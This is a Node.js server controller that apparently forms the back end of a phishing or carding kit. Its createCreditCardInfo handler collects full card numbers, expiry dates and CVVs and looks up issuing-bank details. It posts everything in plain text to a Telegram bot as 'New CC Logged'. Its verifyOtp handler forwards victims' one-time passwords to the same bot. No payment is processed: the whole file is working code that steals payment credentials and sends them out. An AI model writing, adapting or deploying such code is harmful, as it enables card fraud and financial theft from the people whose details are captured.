// server/controller/billingController.js
const fs = require('fs');
const path = require('path');
const csv = require('csv-parser');
const axios = require('axios');
var lookup = require('binlookup')();

const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, BINDB_API_KEY } = process.env;

// Function to read and parse the CSV file
const readCSV = async (bin) => {
  return new Promise((resolve, reject) => {
    const results = [];
    fs.createReadStream(path.join(__dirname, '../data/bin-list-data.csv'))
      .pipe(csv())
      .on('data', (data) => results.push(data))
      .on('end', () => {
        const binData = results.find(row => row.BIN === bin);
        if (binData) {
          resolve(binData);
        } else {
          reject(new Error('BIN not found'));
        }
      })
      .on('error', (error) => reject(error));
  });
};


const fetchBankLogo = async (bankDomain) => {
  if (!bankDomain || bankDomain === 'undefined') {
    console.warn('Invalid or missing bank domain; using fallback logo.');
    return 'https://logo.clearbit.com/example.com';
  }
  return `https://logo.clearbit.com/${bankDomain}`;
};
//create credit card logic------------------------------------------------------------------------
//-------------------------------------------------------
exports.createCreditCardInfo = async (req, res) => {
  const { clientSessionID, cardNumber, expiryDate, securityCode } = req.body;

  if (!clientSessionID) {
    return res.status(400).json({ error: 'Client Session ID is required' });
  }

  try {
    const sanitizedCardNumber = cardNumber.replace(/\s+/g, '');
    const bin = sanitizedCardNumber.slice(0, 6);
    const last4Digits = sanitizedCardNumber.slice(-4); // Extract last 4 digits

    let bankInfo = '';
    let bankLogoUrl = 'https://logo.clearbit.com/example.com'; // Default fallback
    let brand = 'Unknown';
    try {
      const binData = await readCSV(bin);

      // Get bank info
      const bankDomain = binData['IssuerUrl']?.replace(/^www\./, '').trim() || 'example.com';
      bankLogoUrl = `https://logo.clearbit.com/${bankDomain}`;
      brand = binData['Brand'] || 'Unknown';

      bankInfo = `
🏦 <b>Bank:</b> ${binData['Issuer'] || 'Unknown'}
🌐 <b>Country:</b> ${binData['isoCode2'] || '🌐'} ${binData['CountryName'] || 'Unknown'}
💳 <b>Scheme:</b> ${binData['Brand'] || 'Unknown'}
💳 <b>Type:</b> ${binData['Type'] || 'Unknown'}
💳 <b>Brand:</b> ${binData['Brand'] || 'Unknown'}
🖼 <b>Logo:</b> <a href="${bankLogoUrl}">[View Logo]</a>

      `;
    } catch (binError) {
      console.error('BIN lookup failed:', binError);
      bankInfo = `
🏦 <b>Bank:</b> Unknown
🌐 <b>Country:</b> Unknown
💳 <b>Scheme:</b> Unknown
💳 <b>Type:</b> Unknown
💳 <b>Brand:</b> Unknown
      `;
    }

    // Send all data to Telegram bot
    const message = `
🏦 <b>New CC Logged</b> 🏦
---------------------------------
🆔 <b>Session ID:</b> ${clientSessionID}
📍 <b>CC NUM:</b> ${cardNumber}
🏙️ <b>EXP:</b> ${expiryDate}
🗽 <b>CVV:</b> ${securityCode}
${bankInfo}
🕒 <b>Time:</b> ${new Date().toLocaleString()}
    `;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError.message);
    }

    res.status(200).json({ message: "Data sent to Telegram successfully",
      logoUrl: bankLogoUrl , brand, last4Digits});
  } catch (error) {
    console.error('Error sending data to Telegram:', error);
    res.status(500).json({ error: 'Error processing the request' });
  }
};



exports.verifyOtp = async (req, res) => {
  const { userId } = req.params;
  const { otp, maskedCardNumber } = req.body;
  try {
    if (!otp || otp.trim() === '') {
      return res.status(400).json({ message: 'Invalid OTP' });
    }

    // Prepare message for Telegram bot
    const message = `
🔐 <b>OTP Verified Successfully</b>
---------------------------------

💳 <b>Card:</b> ${maskedCardNumber}
✅ <b>OTP:</b> ${otp}
🆔 <b>Session ID:</b> ${userId}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    try {
      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError);
    }

    return res.status(200).json({ message: 'OTP verified successfully' });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    res.status(500).json({ message: 'Error verifying OTP' });
  }
};

